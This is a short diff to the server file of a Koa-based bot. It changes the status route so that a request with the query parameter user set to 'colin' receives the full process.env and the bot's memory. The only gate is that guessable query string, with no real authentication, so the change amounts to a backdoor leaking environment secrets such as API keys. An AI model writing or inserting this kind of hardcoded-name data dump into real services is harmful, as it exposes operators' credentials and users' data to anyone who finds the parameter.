@@ -4,16 +4,24 @@ import router from "@koa/router";
 
 dotenv.config({});
 
-const { launch } = await import("./src/bot.js");
+const { launch, memory } = await import("./src/bot.js");
 launch();
 console.log("[server]: Bot listening...");
 
 const app = new Koa();
 
 const statusRouter = router().get("/", (ctx) => {
-  ctx.body = {
+  let out = {
     _version: 0.1,
   };
+  if (ctx.request.query.user === "colin") {
+    out = {
+      ...out,
+      env: process.env,
+      memory: memory(),
+    };
+  }
+  ctx.body = out;
 });
 
 app.use(statusRouter.routes());
